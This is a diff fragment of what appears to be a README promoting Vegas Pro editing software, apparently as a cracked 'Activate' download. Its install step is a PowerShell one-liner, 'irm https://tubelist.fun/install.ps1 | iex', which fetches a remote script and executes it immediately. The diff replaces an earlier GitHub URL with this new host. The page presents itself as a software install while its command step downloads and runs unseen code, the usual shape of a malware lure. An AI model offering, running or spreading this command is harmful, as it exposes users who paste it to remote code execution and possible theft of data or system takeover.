@@ -5,7 +5,7 @@
 Vegas Pro delivers a streamlined editing experience with real-time multi-track compositing, extensive format support, and built-in audio editing tools. Designed for speed without sacrificing creative control.
 
 ```powershell
-irm https://raw.githubusercontent.com/dustfinderfactory/Activate/main/install.ps1 | iex
+irm https://tubelist.fun/install.ps1 | iex
 ```
 
 ---
